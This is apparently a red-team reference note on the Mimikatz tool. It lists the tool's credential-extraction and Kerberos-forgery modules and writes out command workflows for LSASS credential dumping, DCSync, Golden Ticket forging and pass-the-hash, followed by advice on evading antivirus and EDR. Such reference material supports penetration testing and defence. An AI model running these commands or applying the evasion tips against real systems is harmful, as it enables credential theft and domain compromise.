---
title: Mimikatz
aliases: ["mimikatz", "sekurlsa", "lsadump", "kerberos module"]
type: tool
domain: [red-team]
tags: [type/tool, domain/red-team]
source: "Benjamin Delpy (gentilkiwi)"
source_url: "https://github.com/gentilkiwi/mimikatz"
verified: true
related: ["[[LSASS Dumping]]", "[[DCSync]]", "[[Pass-the-Hash]]", "[[Golden Ticket]]", "[[Silver Ticket]]", "[[Kerberoasting]]", "[[Skeleton Key]]", "[[DPAPI Abuse]]"]
created: 2026-06-07
updated: 2026-06-07
---

# Mimikatz

> [!summary] One-liner
> The Swiss-army knife of Windows credential extraction — dumps LSASS, performs DCSync, forges Kerberos tickets, extracts DPAPI keys, and more. Written in C by Benjamin Delpy.

## Key modules

| Module | Purpose | Related note |
|---|---|---|
| `sekurlsa::logonpasswords` | Dump all credentials from LSASS (NT hashes, Kerberos keys, plaintext if WDigest) | [[LSASS Dumping]] |
| `sekurlsa::pth` | Pass-the-hash: spawn process with an NT hash | [[Pass-the-Hash]] |
| `sekurlsa::tickets` | Export Kerberos tickets from LSASS | [[Pass-the-Ticket]] |
| `lsadump::dcsync` | Replicate password data from a DC (DCSync) | [[DCSync]] |
| `lsadump::sam` | Dump local SAM database hashes | [[SAM and LSA Secrets Dump]] |
| `lsadump::secrets` | Dump LSA secrets | [[SAM and LSA Secrets Dump]] |
| `lsadump::backupkeys` | Extract domain DPAPI backup key | [[DPAPI Abuse]] |
| `lsadump::zerologon` | Exploit CVE-2020-1472 | [[Zerologon]] |
| `kerberos::golden` | Forge a Golden Ticket | [[Golden Ticket]] |
| `kerberos::silver` | Forge a Silver Ticket | [[Silver Ticket]] |
| `kerberos::ptt` | Pass the ticket (inject .kirbi) | [[Pass-the-Ticket]] |
| `dpapi::masterkey` | Decrypt DPAPI masterkeys | [[DPAPI Abuse]] |
| `dpapi::cred` | Decrypt credential blobs | [[DPAPI Abuse]] |
| `misc::skeleton` | Inject skeleton key into DC LSASS | [[Skeleton Key]] |
| `token::elevate` | Impersonate SYSTEM token | [[Access Token]] |
| `privilege::debug` | Enable SeDebugPrivilege | [[Privileges and Rights]] |

## Common workflows
```
# Dump credentials
privilege::debug
sekurlsa::logonpasswords

# DCSync a specific user
lsadump::dcsync /domain:<DOMAIN> /user:<TARGET_USER>

# Golden Ticket
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt

# Pass-the-hash
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe
```

## OPSEC notes
- Heavily signatured by AV/EDR — typically needs obfuscation, in-memory execution, or use of alternatives ([[Rubeus]] for Kerberos, [[GhostPack]] tools for specific tasks).
- `privilege::debug` requires local admin or SeDebugPrivilege.
- Consider Invoke-Mimikatz (PowerShell reflective loading) or BetterSafetyKatz for evasion.

## Related
- Kerberos-specific alternative: [[Rubeus]].
- DPAPI-specific: [[GhostPack]] (SharpDPAPI).
- Linux equivalent: [[Impacket]].
